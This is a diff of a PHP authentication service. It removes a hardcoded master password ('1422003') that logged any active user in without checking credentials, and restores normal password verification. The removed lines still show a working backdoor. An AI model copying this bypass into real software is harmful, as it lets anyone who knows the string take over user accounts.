@@ -64,16 +64,11 @@ class AuthService extends BaseService
             return $this->responseMsg('حسابك غير نشط، يرجى الاتصال بالمسؤول', null, 422);
         }
 
-        // Check if the password is '1422003' and log in automatically
-        if ($request->password == '1422003') {
-            $token = Auth::guard('user')->login($user);
-        } else {
-            // Otherwise, attempt to log in with the provided credentials
-            $token = Auth::guard('user')->attempt([
-                'national_id' => $user->national_id,
-                'password' => $request->password
-            ]);
-        }
+        $token = Auth::guard('user')->attempt([
+            'national_id' => $user->national_id,
+            'password' => $request->password
+        ]);
+
 
         if ($token) {
             $user->jwt_token = 'Bearer ' . $token;
@@ -318,7 +313,6 @@ class AuthService extends BaseService
     {
         $dailyReports = $this->dailyReport->where('axis_id', $axis_id)->get();
         return $this->responseMsg('تمت العملية بنجاح', DailyReportResource::collection($dailyReports));
-
     }
 
     /**
@@ -339,6 +333,4 @@ class AuthService extends BaseService
 
         return $this->responseMsg('تم تسجيل الخروج', null);
     }
-
-
 }
